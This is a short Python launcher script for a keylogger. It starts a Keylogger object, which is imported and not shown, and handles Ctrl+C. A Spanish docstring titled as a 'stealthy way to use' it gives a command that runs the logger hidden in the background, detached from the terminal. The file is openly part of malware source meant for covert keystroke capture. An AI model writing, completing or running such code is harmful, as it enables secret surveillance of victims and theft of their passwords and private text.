#!/usr/bin/env python3

from keylogger import Keylogger
import signal
import sys
from termcolor import colored


def def_handler(sig, frame):

        print(colored(f"\n[!] Leaving the program...\n", 'red'))
        my_keylogger.shutdown()
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


# Initial program flow
if __name__ == '__main__':

    # Object instantiated from the Keylogger class
    my_keylogger = Keylogger()
    my_keylogger.start()


"""
EXPLICACIÓN:

MANERA SIGILOSADE USAR:
        python3 main.py &>/dev/null & disown

        Para que este en segundo plano corriendo y que no dependa del padre

        # Es importante saber que estamos llamando a un metodo de la clase Keylogger, para poder cerrar bien el programa en caso de que se presione Ctrl+C
def def_handler(sig, frame):

        print(colored(f"\n[!] Leaving the program...\n", 'red'))
        Keylogger.shutdown()
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)




"""